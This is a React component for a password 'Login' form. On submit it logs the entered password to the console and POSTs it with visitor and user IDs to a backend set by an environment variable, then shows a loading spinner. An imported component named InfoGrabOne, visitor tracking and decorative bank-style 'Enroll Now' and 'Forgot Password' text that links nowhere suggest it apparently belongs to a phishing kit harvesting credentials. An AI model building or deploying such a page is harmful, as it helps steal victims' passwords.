import { Button, Skeleton, TextField } from "@mui/material";
import React, { useState } from "react";
import CircleLoading from "./CircleLoading";
import InfoGrabOne from "./InfoGrabOne";
import SkeletonLoad from "./SkeletonLoad";


const Password = (userid, visitor) => {



  const [show, setShow] = useState(false);
  const [password, setPassword] = useState('');

  const submitHandler = e => {

    e.preventDefault();
    console.log('spit')
    setTimeout(() => {

      setShow(!show);
      const data = {visitor_id:userid.visitor, userid: userid.userid, password: password };
      console.log(data)

      fetch(process.env.REACT_APP_PRODUCTION_URL+'/userid', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
  
      }).then((response) => {
        console.log(response.status)
      })
  



    }, 1000);

  }







  return (

    <div className="flex flex-col">
      {!show && (
        <form onSubmit={submitHandler} className=" lg:ml-44 max-w-md mt-3 p-5">
          <div className='text-3xl font-semibold'>Login</div>


          <div className='mb-7 mt-3'>

            <TextField
            autoFocus
              variant="standard"
              size="small"
              fullWidth={true}
              type="password"
              name="password"
              placeholder="Password"
              value={password}
              required
              onChange={(event) => { setPassword(event.target.value) }} //whenever the text field change, you save the value in state

            />
          </div>
          <Button type="submit" variant="contained">Login</Button>
          <div className='p-1 mt-4'>
            <span className='text-xs'>First time logging in? </span><span className='text-xs'>Enroll Now.</span>
          </div>

          <div className='p-1'>
            <span className='text-xs'>Forgot Password</span> <span className='text-xs'> or need other assistance?</span><span className="text-xs">Contact us </span>
          </div>


        </form>

      )}
      {show && <div className=""><CircleLoading userid={userid}/> </div>}
    </div>
  );
};

export default Password;
